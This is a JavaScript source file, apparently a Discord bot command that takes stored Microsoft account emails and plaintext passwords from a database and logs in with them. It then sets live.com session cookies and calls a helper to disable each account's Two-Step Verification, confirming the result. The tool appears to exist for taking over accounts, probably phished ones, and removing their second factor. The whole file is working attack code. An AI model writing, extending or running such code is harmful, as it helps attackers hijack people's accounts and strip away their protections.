const accountsmsg = require("../../utils/accounts/accountsmsg");
const { queryParams } = require("../../../db/database");
const isOwner = require("../../../db/isOwner");
const HttpClient = require("../../utils/process/HttpClient");
const disableTfa = require("../../utils/secure/disableTfa");
const { getSecurityProofsRaw } = require("../../utils/secure/securityInformation");
const login = require("../../utils/secure/login");
const getCookies = require("../../utils/secure/getCookies");
const polishHost = require("../../utils/secure/polishHost");

module.exports = {
  name: "disable2fa",
  userOnly: true,
  callback: async (client, interaction) => {
    try {
      const parts = interaction.customId.split("|");
      const [userId, uid] = parts.length >= 3 ? [parts[1], parts[2]] : [interaction.user.id, parts[1]];

      if (!uid) return interaction.reply({ content: "Missing account identifier.", ephemeral: true });
      if (userId && interaction.user.id !== userId && !(await isOwner(interaction.user.id))) {
        return interaction.reply({ content: "You do not have permission to modify this account.", ephemeral: true });
      }

      await interaction.deferUpdate().catch(() => {});

      const [account] = (await queryParams("SELECT * FROM accounts WHERE uid = ?", [uid])) || [];
      if (!account) return interaction.followUp({ content: "Account not found.", ephemeral: true });

      if (account.secretkey === "Disabled" || account.secretkey === "Option is disabled.") {
        return interaction.editReply(await accountsmsg(userId, null, uid));
      }

      const [status] = (await queryParams("SELECT msauth, password, email FROM status WHERE uid = ?", [uid])) || [];
      let msauth = status?.msauth || null;
      const password = status?.password || account.password;
      const email = status?.email || account.email;

      if (!msauth && email && password && password !== "unauthed" && password !== "Not set") {
        try {
          const host = await login({ email, pw: password });
          const cookies = host ? await getCookies() : null;
          msauth = cookies?.[1] ? await polishHost(host, cookies[1]) : host;
          if (msauth) await queryParams("UPDATE status SET msauth = ? WHERE uid = ?", [msauth, uid]);
        } catch {}
      }

      const axios = new HttpClient(true);
      if (msauth) {
        axios.setCookie(`__Host-MSAAUTH=${msauth}; Domain=.live.com; Path=/`);
        axios.setCookie(`__Host-MSAAUTHP=${msauth}; Domain=.live.com; Path=/`);
      }

      const proofs = await getSecurityProofsRaw(axios).catch(() => null);
      const isAlreadyDisabled = proofs?.raw && Object.keys(proofs.raw).length > 0 && !(proofs.twoStepVerification === true || proofs.raw?.tfaEnabled === 1);

      let success = isAlreadyDisabled;
      if (!success) {
        const mutation = await disableTfa(axios, proofs?.canary || null);
        const verified = await getSecurityProofsRaw(axios).catch(() => null);
        success = mutation && !(verified?.twoStepVerification === true || verified?.raw?.tfaEnabled === 1);
      }

      if (!success) {
        return interaction.followUp({
          content: "Could not disable 2FA: Microsoft did not remove Two-Step Verification. Please verify session or try again.",
          ephemeral: true
        });
      }

      await queryParams("UPDATE accounts SET secretkey = 'Disabled' WHERE uid = ?", [uid]);
      await queryParams("UPDATE status SET secretkey = 'Disabled' WHERE uid = ?", [uid]);
      return interaction.editReply(await accountsmsg(userId, null, uid));
    } catch (err) {
      console.error("[DISABLE_2FA] Error:", err.message);
      const method = interaction.deferred || interaction.replied ? 'followUp' : 'reply';
      return interaction[method]({ content: "An error occurred while disabling 2FA.", ephemeral: true }).catch(() => {});
    }
  }
};
